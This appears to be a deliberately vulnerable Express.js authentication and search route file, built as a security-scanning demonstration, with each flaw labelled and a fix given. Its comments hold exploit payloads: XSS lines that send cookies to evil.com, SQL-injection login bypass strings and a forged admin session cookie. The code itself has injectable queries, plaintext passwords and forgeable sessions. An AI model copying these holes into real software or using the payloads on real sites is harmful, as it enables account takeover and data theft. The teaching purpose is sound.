/**
 * src/routes/auth.js – Authentication & search endpoints
 *
 * ⚠️  WARNING: This file contains INTENTIONAL security vulnerabilities
 *     for DevSecOps pipeline scanning demonstration ONLY.
 *
 * ─────────────────────────────────────────────────────────────
 * [VULN-004] Reflected XSS – CWE-79 – OWASP A03:2021
 *   Severity : HIGH  |  CVSS v3: 6.1
 *   Rule     : javascript.express.security.audit.xss.reflected
 *   MITRE    : T1059.007 – Command and Scripting Interpreter: JavaScript
 *
 *   Risk     : Attacker crafts a malicious URL with a script payload
 *              in the 'q' parameter. When sent to a victim, the payload
 *              executes in their browser, stealing cookies or credentials.
 *   Fix      : HTML-encode all output:
 *              const he = require('he'); he.encode(req.query.q)
 *              Use res.json() instead of res.send() for data responses.
 *
 * [VULN-008] Broken Authentication – CWE-287 – OWASP A07:2021
 *   Severity : HIGH  |  CVSS v3: 8.1
 *   Risk     : Login endpoint has no rate limiting, no account lockout,
 *              and performs plaintext password comparison.
 *   Fix      : Use bcrypt for password hashing, implement rate limiting
 *              (express-rate-limit), and add account lockout logic.
 * ─────────────────────────────────────────────────────────────
 */

'use strict';

const express = require('express');
const router  = express.Router();
const { db, JWT_SECRET } = require('../config/db');

// ──────────────────────────────────────────────────────────────
// GET /api/search?q=<query>
// Search for users by keyword and return HTML results.
//
// [VULN-004] CWE-79: Reflected Cross-Site Scripting (XSS)
// ──────────────────────────────────────────────────────────────
router.get('/search', (req, res) => {
  const query = req.query.q || '';

  // [VULN-004] XSS – CWE-79 – OWASP A03:2021
  // VULNERABLE: user-supplied 'q' is reflected directly into HTML without encoding.
  // Exploit: GET /api/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>
  //          GET /api/search?q=<img src=x onerror="fetch('https://evil.com/'+btoa(document.cookie))">
  // No output encoding
  const html = `
    <!DOCTYPE html>
    <html>
    <head><title>Search – vulnerable-app</title></head>
    <body>
      <h1>Search Results</h1>
      <!-- [VULN-004] CWE-79: raw unsanitized user input rendered in HTML -->
      <p>You searched for: <b>${query}</b></p>
      <!-- Correct approach: <b>${'<!-- he.encode(query) -->'.replace(/</g, '&lt;')}</b> -->
      <div id="results">
        <p>No results found for <em>${query}</em></p>
      </div>
    </body>
    </html>
  `; // [VULN-004] NEVER interpolate req.query values directly into HTML

  // [VULN-004] Sending HTML response with unescaped user input
  res.setHeader('Content-Type', 'text/html');
  // Missing Content-Security-Policy header [VULN-MISSING-HEADERS]
  res.send(html);
});

// ──────────────────────────────────────────────────────────────
// POST /api/login
// Authenticates a user with username/password.
//
// [VULN-008] CWE-287: Broken Authentication
// [VULN-001] CWE-89 : SQL Injection via username field
// [VULN-004] CWE-79 : XSS in error response
// ──────────────────────────────────────────────────────────────
router.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'username and password are required' });
  }

  // [VULN-001] SQLi via login – classic auth bypass
  // Exploit: username = admin' --     password = anything
  //          username = ' OR '1'='1  password = anything
  //          → Returns first user row, bypassing password check entirely
  const query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"; // [VULN-001]

  // Correct approach:
  // db.get('SELECT * FROM users WHERE username = ?', [username], (err, user) => {
  //   if (!user || !bcrypt.compareSync(password, user.password)) return 401;
  // });

  db.get(query, (err, user) => {
    if (err) {
      return res.status(500).json({ error: err.message }); // [VULN-007]
    }
    if (!user) {
      // [VULN-004] XSS in error – username reflected into JSON (safe here) but
      // if rendered in HTML template without escaping, triggers XSS.
      return res.status(401).json({
        error:    'Invalid credentials',
        username, // [VULN-004] reflected back – dangerous if consumed by vulnerable HTML template
      });
    }

    // [VULN-008] No rate limiting – brute force is possible without restriction
    // [VULN-008] Session token not set with Secure or SameSite flags
    res.cookie('session', Buffer.from(user.id + ':' + user.role).toString('base64'), {
      httpOnly: true,
      // secure: true,      // [VULN-MISSING] Missing Secure flag – CWE-614
      // sameSite: 'strict', // [VULN-MISSING] Missing SameSite – CSRF risk
    });

    res.json({
      message:  'Login successful',
      user: {
        id:       user.id,
        username: user.username,
        role:     user.role,
        password: user.password, // [VULN-002] NEVER return password to client
      },
    });
  });
});

// ──────────────────────────────────────────────────────────────
// GET /api/profile
// Returns the current user's profile.
//
// [VULN-008] CWE-287: No real session validation
// ──────────────────────────────────────────────────────────────
router.get('/profile', (req, res) => {
  const sessionCookie = req.cookies && req.cookies.session;

  if (!sessionCookie) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  // [VULN-008] Trivially forgeable session – just base64(id:role)
  // Exploit: session = btoa('1:admin')  → instant privilege escalation to admin
  let decoded;
  try {
    decoded = Buffer.from(sessionCookie, 'base64').toString('utf8');
  } catch {
    return res.status(401).json({ error: 'Invalid session' });
  }

  const [id, role] = decoded.split(':'); // [VULN-008] no cryptographic verification

  db.get('SELECT id, username, email, role FROM users WHERE id = ?', [id], (err, user) => {
    if (err || !user) {
      return res.status(401).json({ error: 'Session invalid or user not found' });
    }
    res.json({ user });
  });
});

module.exports = router;
